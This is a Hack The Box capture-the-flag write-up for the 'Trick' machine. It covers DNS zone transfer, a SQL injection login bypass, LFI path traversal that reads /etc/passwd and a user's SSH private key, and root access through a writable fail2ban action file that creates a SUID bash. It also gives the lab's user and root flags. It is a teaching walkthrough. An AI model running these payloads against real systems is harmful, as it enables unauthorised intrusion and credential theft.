---
layout: writeup
name: "Trick"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/trick/
os: "Hack The BoxIP Address 101011166Difficulty Easy"
date: 2025-11-12
pwned: true
---

# CTF Writeup Trick - Hack The Box

## 🧪 Machine Name: `Trick`

**Platform:** Hack The Box**IP Address:** `10.10.11.166`**Difficulty:** Easy

---

## 🛍️ Overview

Trick is an Easy Linux machine that demonstrates a variety of enumeration and privilege escalation techniques. The target hosts multiple virtual hosts and a DNS service which must be queried to resolve subdomains. Through SQL injection and local file inclusion, a shell is gained. Root is obtained by exploiting `fail2ban` misconfiguration via group-writable configuration files.

---

## 🔍 Enumeration

### 🔎 Nmap Scan

```bash
nmap -p- trick.htb --min-rate 10000
nmap -p 22,25,53,80 trick.htb -sCV -oN nmapscan
```

### DNS Zone Transfer

```bash
dig AXFR trick.htb @10.10.11.166
```

Revealed subdomain: `preprod-payroll.trick.htb`

### SMTP Snooping

```bash
telnet trick.htb 25
VRFY root
VRFY admin
```

---

## 🔢 Foothold

### SQL Injection Login

```sql
Username: admin' OR 1=1 LIMIT 1;-- -
```

Login successful on `http://preprod-payroll.trick.htb/login.php`

### Virtual Host Discovery

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -fs 5480
```

Discovered: `preprod-marketing.trick.htb`

### Local File Inclusion

```bash
ffuf -w dirTraversal-nix.txt -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -fs 0
```

Found traversal:

```text
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
```

Confirmed user `michael`

### Reading Private SSH Key

```text
http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa
```

### SSH Login

```bash
chmod 600 id_rsa
ssh -i id_rsa michael@trick.htb
```

User flag: `dbb4962a2e4eb8f22f428a1e84d54526`

---

## 🕵️️ Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

### Writable `fail2ban` Config

`/etc/fail2ban/action.d` is group-writable by `michael`

### Payload

Modified action file:

```ini
actionban = cp /bin/bash /tmp; chmod +s /tmp/bash
actionunban = chmod +s /tmp/bash
```

Trigger a ban with brute force or crafted traffic, then:

```bash
/tmp/bash -p
```

### Root flag

```bash
cat /root/root.txt
3d0fb710908d01e7f224684957fe1512
```

---

## 🧠 Lessons Learned

- DNS enumeration and subdomain resolution
- SQLi login bypass
- LFI via page parameter and path traversal
- Reading files for SSH key reuse
- Abusing writable `fail2ban` configuration for root access

---

*Writeup by inksec**GitHub: *[*https://github.com/inkedqt*](https://github.com/inkedqt)
